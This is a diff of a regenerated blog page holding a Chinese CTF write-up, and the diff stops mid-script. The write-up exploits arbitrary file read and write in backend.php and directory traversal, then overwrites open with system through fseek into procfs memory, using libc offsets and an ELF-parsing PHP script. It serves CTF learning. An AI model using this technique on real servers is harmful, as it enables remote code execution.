@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -296,35 +296,35 @@
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;backend.php&#34;</span><span class="p">,</span> <span class="p">{</span>
-        <span class="nx">readfile</span><span class="o">:</span> <span class="s2">&#34;data/FakeCTFer.txt&#34;</span>
-    <span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
-    <span class="p">});</span>
-    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;backend.php&#34;</span><span class="p">,</span> <span class="p">{</span>
-        <span class="nx">readfile</span><span class="o">:</span> <span class="s2">&#34;data/RealCTFer.txt&#34;</span>
-    <span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
-    <span class="p">});</span>
-<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
-<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real-sub&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;backend.php&#34;</span><span class="p">,</span> <span class="p">{</span>
-        <span class="nx">writefile</span><span class="o">:</span> <span class="s2">&#34;data/RealCTFer.txt&#34;</span><span class="p">,</span>
-        <span class="nx">buffer</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real-text&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span><span class="o">+</span> <span class="s2">&#34;\n\n&#34;</span><span class="p">,</span>
-        <span class="nx">offset</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">().</span><span class="nx">length</span>
-    <span class="p">});</span>
-    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real-text&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
-<span class="p">});</span>
-<span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake-sub&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;backend.php&#34;</span><span class="p">,</span> <span class="p">{</span>
-        <span class="nx">writefile</span><span class="o">:</span> <span class="s2">&#34;data/FakeCTFer.txt&#34;</span><span class="p">,</span>
-        <span class="nx">buffer</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake-text&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;\n\n&#34;</span><span class="p">,</span>
-        <span class="nx">offset</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">().</span><span class="nx">length</span>
-    <span class="p">});</span>
-    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake-text&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
-<span class="p">});</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;backend.php&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">readfile</span><span class="o">:</span> <span class="s2">&#34;data/FakeCTFer.txt&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;backend.php&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">readfile</span><span class="o">:</span> <span class="s2">&#34;data/RealCTFer.txt&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real-sub&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;backend.php&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">writefile</span><span class="o">:</span> <span class="s2">&#34;data/RealCTFer.txt&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">buffer</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real-text&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span><span class="o">+</span> <span class="s2">&#34;\n\n&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">offset</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">().</span><span class="nx">length</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#real-text&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake-sub&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;backend.php&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">writefile</span><span class="o">:</span> <span class="s2">&#34;data/FakeCTFer.txt&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">buffer</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake-text&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;\n\n&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">offset</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">().</span><span class="nx">length</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#fake-text&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>      大概就是GET传参<code>readfile</code>或<code>writefile</code>访问<code>/backend.php</code>路由读写文件，此处存在一个<strong>任意文件读取漏洞</strong>，通过<code>readfile</code>可以读取backend.php内容：</p>
 <div class="highlight"><div class="chroma">
@@ -345,21 +345,21 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nv">$offset</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;offset&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;offset&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
-<span class="nv">$buffer</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;buffer&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;buffer&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;writefile&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$fp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;writefile&#39;</span><span class="p">],</span> <span class="s2">&#34;a&#34;</span><span class="p">);</span>
-    <span class="nx">fseek</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">);</span>
-    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">);</span>
-    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;readfile&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;readfile&#39;</span><span class="p">]);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$offset</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;offset&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;offset&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$buffer</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;buffer&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;buffer&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;writefile&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;writefile&#39;</span><span class="p">],</span> <span class="s2">&#34;a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fseek</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;readfile&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;readfile&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>      然后利用<strong>目录穿越</strong>读index.php文件内容：</p>
 <div class="highlight"><div class="chroma">
@@ -375,16 +375,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-
-<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;sandbox&#39;</span><span class="p">]))</span> <span class="p">{</span>
-  <span class="nv">$uuid</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;/var/www/html/copy&#34;</span><span class="p">);</span>
-  <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;sandbox&#34;</span><span class="p">,</span> <span class="nv">$uuid</span><span class="p">);</span>
-  <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: sandbox/&#34;</span><span class="o">.</span><span class="nv">$uuid</span><span class="p">);</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-  <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: sandbox/&#34;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;sandbox&#39;</span><span class="p">]);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;sandbox&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$uuid</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;/var/www/html/copy&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;sandbox&#34;</span><span class="p">,</span> <span class="nv">$uuid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: sandbox/&#34;</span><span class="o">.</span><span class="nv">$uuid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: sandbox/&#34;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;sandbox&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>      审计backend.php代码，fseek函数存在利用点，fseek利用参考<a href="https://github.com/beched/php_disable_functions_bypass/blob/master/procfs_bypass.php" target="_blank" rel="noopener">procfs_bypass.php</a>脚本，看不懂就<a href="http://www.plasf.cn/articles/d5a07c1f3f.html" target="_blank" rel="noopener">西湖论剑 Flagshop 分析复现</a>。</p>
 <p>我老菜狗了，直接照着做一遍。。。</p>
@@ -402,8 +402,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">readelf -s ./backend.php<span class="se">\?</span><span class="nv">readfile</span><span class="o">=</span>%2Flib%2Fx86_64-linux-gnu%2Flibc-2.19.so <span class="p">|</span> egrep <span class="s2">&#34;\s(system|open)@@&#34;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">readelf -s ./backend.php<span class="se">\?</span><span class="nv">readfile</span><span class="o">=</span>%2Flib%2Fx86_64-linux-gnu%2Flibc-2.19.so <span class="p">|</span> egrep <span class="s2">&#34;\s(system|open)@@&#34;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>得到函数偏移地址：</p>
 <blockquote>
@@ -420,11 +420,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">echo</span> <span class="nx">dechex</span><span class="p">(</span><span class="mh">0x7ffff5f40000</span><span class="o">+</span><span class="mh">0x0000000000046590</span><span class="p">);</span>
-<span class="c1">//system函数结果：0x7ffff5f86590
-</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">dechex</span><span class="p">(</span><span class="mh">0x7ffff5f40000</span><span class="o">+</span><span class="mh">0x0000000000046590</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//system函数结果：0x7ffff5f86590
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>      知道system函数的地址之后就可以将open函数的地址替换为system函数的地址，这样在执行file_get_contents函数时命令实际执行的却是system函数，可以将readflag的结果输出到文件，或者反弹shell。</p>
 <p>接下来就是计算open函数的地址，这里需要用到<code>/proc/self/exe</code>。</p>
@@ -513,83 +513,83 @@
 </span><span class="lnt">76
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">function</span> <span class="nf">packlli</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$higher</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
-    <span class="nv">$lower</span> <span class="o">=</span> <span class="nv">$value</span> <span class="o">&amp;</span> <span class="mh">0x00000000ffffffff</span><span class="p">;</span>
-    <span class="k">return</span> <span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;V2&#39;</span><span class="p">,</span> <span class="nv">$lower</span><span class="p">,</span> <span class="nv">$higher</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="k">function</span> <span class="nf">unp</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="nx">hexdec</span><span class="p">(</span><span class="nx">bin2hex</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nv">$value</span><span class="p">)));</span>
-<span class="p">}</span>
-<span class="k">function</span> <span class="nf">parseelf</span><span class="p">(</span><span class="nv">$bin_ver</span><span class="p">,</span> <span class="nv">$rela</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$bin</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$bin_ver</span><span class="p">);</span>
-    <span class="nv">$e_shoff</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-    <span class="nv">$e_shentsize</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
-    <span class="nv">$e_shnum</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
-    <span class="nv">$e_shstrndx</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
-
-    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_shnum</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$sh_type</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
-        <span class="k">if</span><span class="p">(</span><span class="nv">$sh_type</span> <span class="o">==</span> <span class="mi">11</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// SHT_DYNSYM 
-</span><span class="c1"></span>            <span class="nv">$dynsym_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-            <span class="nv">$dynsym_size</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-            <span class="nv">$dynsym_entsize</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-        <span class="p">}</span>
-        <span class="k">elseif</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$strtab_off</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$sh_type</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// SHT_STRTAB
-</span><span class="c1"></span>            <span class="nv">$strtab_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-            <span class="nv">$strtab_size</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-        <span class="p">}</span>
-        <span class="k">elseif</span><span class="p">(</span><span class="nv">$rela</span> <span class="o">&amp;&amp;</span> <span class="nv">$sh_type</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// SHT_RELA
-</span><span class="c1"></span>            <span class="nv">$relaplt_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-            <span class="nv">$relaplt_size</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-            <span class="nv">$relaplt_entsize</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="k">if</span><span class="p">(</span><span class="nv">$rela</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$relaplt_off</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$relaplt_off</span> <span class="o">+</span> <span class="nv">$relaplt_size</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="nv">$relaplt_entsize</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$r_offset</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-            <span class="nv">$r_info</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
-            <span class="nv">$name_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$dynsym_off</span> <span class="o">+</span> <span class="nv">$r_info</span> <span class="o">*</span> <span class="nv">$dynsym_entsize</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
